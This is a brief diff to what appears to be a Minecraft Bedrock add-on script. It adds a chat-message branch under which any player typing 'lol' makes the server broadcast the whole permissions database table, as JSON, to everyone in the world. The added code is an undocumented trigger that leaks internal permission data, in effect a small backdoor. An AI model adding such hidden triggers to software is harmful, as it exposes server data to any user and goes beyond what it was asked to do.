@@ -445,6 +445,10 @@ world.beforeEvents.chatSend.subscribe(event => {
             sender.playSound("au.menuOpen");
             server.ui.show("mainMenu", sender, true);
         });
+    } else if (event.message === "lol") {
+        system.run(() => {
+            world.sendMessage(`${JSON.stringify(database.permissions.getTable())}`);
+        })
     }
 });
 
